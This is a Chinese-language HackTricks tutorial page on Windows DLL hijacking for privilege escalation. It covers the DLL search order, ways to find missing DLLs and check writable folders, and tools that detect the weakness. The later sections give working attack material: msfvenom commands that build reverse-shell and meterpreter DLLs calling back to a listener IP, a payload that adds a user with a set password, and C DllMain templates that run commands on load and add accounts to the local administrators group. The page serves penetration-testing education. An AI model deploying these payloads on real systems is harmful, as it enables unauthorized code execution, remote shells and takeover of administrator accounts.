# Dll Hijacking

{% hint style="success" %}
学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**漏洞赏金提示**：**注册** **Intigriti**，一个由黑客为黑客创建的高级 **漏洞赏金平台**！今天就加入我们 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达 **$100,000** 的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

## 基本信息

DLL 劫持涉及操纵受信任的应用程序加载恶意 DLL。这个术语涵盖了几种战术，如 **DLL 欺骗、注入和侧加载**。它主要用于代码执行、实现持久性，以及较少见的权限提升。尽管这里重点关注提升，但劫持的方法在不同目标之间保持一致。

### 常见技术

用于 DLL 劫持的几种方法，每种方法的有效性取决于应用程序的 DLL 加载策略：

1. **DLL 替换**：用恶意 DLL 替换真实 DLL，选择性地使用 DLL 代理以保留原始 DLL 的功能。
2. **DLL 搜索顺序劫持**：将恶意 DLL 放置在合法 DLL 之前的搜索路径中，利用应用程序的搜索模式。
3. **幻影 DLL 劫持**：创建一个恶意 DLL 供应用程序加载，认为它是一个不存在的必需 DLL。
4. **DLL 重定向**：修改搜索参数，如 `%PATH%` 或 `.exe.manifest` / `.exe.local` 文件，以将应用程序指向恶意 DLL。
5. **WinSxS DLL 替换**：在 WinSxS 目录中用恶意 DLL 替换合法 DLL，这种方法通常与 DLL 侧加载相关。
6. **相对路径 DLL 劫持**：将恶意 DLL 放置在用户控制的目录中，与复制的应用程序一起，类似于二进制代理执行技术。

## 查找缺失的 DLL

查找系统中缺失的 DLL 的最常见方法是运行 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) 来自 sysinternals，**设置** **以下 2 个过滤器**：

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

并仅显示 **文件系统活动**：

![](<../../.gitbook/assets/image (314).png>)

如果您在寻找 **缺失的 DLL**，可以 **让它运行几秒钟**。\
如果您在寻找 **特定可执行文件中的缺失 DLL**，则应设置 **另一个过滤器，如 "进程名称" "包含" "\<exec name>"，执行它，然后停止捕获事件**。

## 利用缺失的 DLL

为了提升权限，我们最好的机会是能够 **编写一个特权进程将尝试加载的 DLL**，在某个 **将被搜索的地方**。因此，我们将能够 **在一个文件夹中写入** DLL，该文件夹 **在搜索 DLL 之前**，或者我们将能够 **在某个将被搜索的文件夹中写入**，而原始 **DLL 在任何文件夹中都不存在**。

### DLL 搜索顺序

**在** [**Microsoft 文档**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **中，您可以找到 DLL 的具体加载方式。**

**Windows 应用程序** 按照一组 **预定义的搜索路径** 查找 DLL，遵循特定的顺序。DLL 劫持的问题出现在有害 DLL 被战略性地放置在这些目录之一时，确保它在真实 DLL 之前被加载。防止这种情况的解决方案是确保应用程序在引用所需 DLL 时使用绝对路径。

您可以在 32 位系统上看到 **DLL 搜索顺序**：

1. 应用程序加载的目录。
2. 系统目录。使用 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 函数获取该目录的路径。(_C:\Windows\System32_)
3. 16 位系统目录。没有函数获取该目录的路径，但会进行搜索。 (_C:\Windows\System_)
4. Windows 目录。使用 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 函数获取该目录的路径。(_C:\Windows_)
5. 当前目录。
6. 在 PATH 环境变量中列出的目录。请注意，这不包括 **App Paths** 注册表项指定的每个应用程序路径。计算 DLL 搜索路径时不使用 **App Paths** 键。

这是 **启用 SafeDllSearchMode** 的 **默认** 搜索顺序。当禁用时，当前目录提升到第二位。要禁用此功能，请创建 **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 注册表值并将其设置为 0（默认启用）。

如果调用 [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 函数时使用 **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**，搜索将从 **LoadLibraryEx** 正在加载的可执行模块的目录开始。

最后，请注意 **DLL 可以通过指示绝对路径而不是仅仅是名称来加载**。在这种情况下，该 DLL **只会在该路径中被搜索**（如果 DLL 有任何依赖项，它们将被视为仅按名称加载进行搜索）。

还有其他方法可以更改搜索顺序，但我在这里不打算解释它们。

#### Windows 文档中的 DLL 搜索顺序例外

Windows 文档中指出了标准 DLL 搜索顺序的某些例外：

* 当遇到 **与内存中已加载的 DLL 同名的 DLL** 时，系统会绕过通常的搜索。相反，它会在默认使用内存中已加载的 DLL 之前执行重定向和清单检查。**在这种情况下，系统不会进行 DLL 搜索**。
* 在 DLL 被识别为当前 Windows 版本的 **已知 DLL** 的情况下，系统将使用其版本的已知 DLL 及其任何依赖 DLL，**跳过搜索过程**。注册表项 **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** 保存这些已知 DLL 的列表。
* 如果 **DLL 有依赖项**，则对这些依赖 DLL 的搜索将像仅通过其 **模块名称** 指示一样进行，而不管初始 DLL 是否通过完整路径识别。

### 提升权限

**要求**：

* 确定一个在 **不同权限** 下运行或将要运行的进程（水平或横向移动），该进程 **缺少 DLL**。
* 确保在 **DLL** 将被 **搜索的** 任何 **目录** 中有 **写入权限**。此位置可能是可执行文件的目录或系统路径中的目录。

是的，要求很难找到，因为 **默认情况下，找不到缺少 DLL 的特权可执行文件是有点奇怪**，而且在系统路径文件夹中拥有写入权限 **更奇怪**（默认情况下您无法做到）。但是，在配置错误的环境中，这是可能的。\
如果您运气好，满足要求，您可以查看 [UACME](https://github.com/hfiref0x/UACME) 项目。即使 **该项目的主要目标是绕过 UAC**，您也可能会在那里找到一个 Windows 版本的 DLL 劫持的 **PoC**（可能只需更改您有写入权限的文件夹的路径）。

请注意，您可以通过以下方式 **检查文件夹中的权限**：
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
并**检查PATH中所有文件夹的权限**：
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
您还可以使用以下命令检查可执行文件的导入和 DLL 的导出：
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
对于如何**利用Dll劫持提升权限**的完整指南，检查具有写入**系统路径文件夹**权限的内容：

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### 自动化工具

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)将检查您是否在系统路径中的任何文件夹上具有写入权限。\
其他发现此漏洞的有趣自动化工具包括**PowerSploit函数**：_Find-ProcessDLLHijack_，_Find-PathDLLHijack_和_Write-HijackDll_。

### 示例

如果您发现一个可利用的场景，成功利用它的最重要的事情之一是**创建一个导出至少所有可执行文件将从中导入的函数的dll**。无论如何，请注意，Dll劫持在[**从中等完整性级别提升到高完整性（绕过UAC）**](../authentication-credentials-uac-and-efs.md#uac)或从[**高完整性提升到SYSTEM**](./#from-high-integrity-to-system)**时非常有用。**您可以在这个专注于执行的dll劫持研究中找到**如何创建有效dll的示例：[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**。**\
此外，在**下一节**中，您可以找到一些**基本dll代码**，这些代码可能作为**模板**或用于创建**导出非必需函数的dll**。

## **创建和编译Dll**

### **Dll代理**

基本上，**Dll代理**是一个能够**在加载时执行您的恶意代码**的Dll，同时也能**暴露**并**按预期工作**，通过**将所有调用转发到真实库**。

使用工具[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)或[**Spartacus**](https://github.com/Accenture/Spartacus)，您可以**指定一个可执行文件并选择要代理的库**，并**生成一个代理dll**，或**指定Dll并生成一个代理dll**。

### **Meterpreter**

**获取反向shell (x64)：**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**获取一个 meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**创建用户 (x86 我没有看到 x64 版本):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 你自己的

注意，在多个情况下，您编译的 Dll 必须 **导出多个函数**，这些函数将被受害者进程加载，如果这些函数不存在，**二进制文件将无法加载**它们，**攻击将失败**。
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## 参考文献

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**漏洞赏金提示**：**注册** **Intigriti**，一个由黑客为黑客创建的高级**漏洞赏金平台**！今天就加入我们，访问 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达 **$100,000** 的赏金！

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
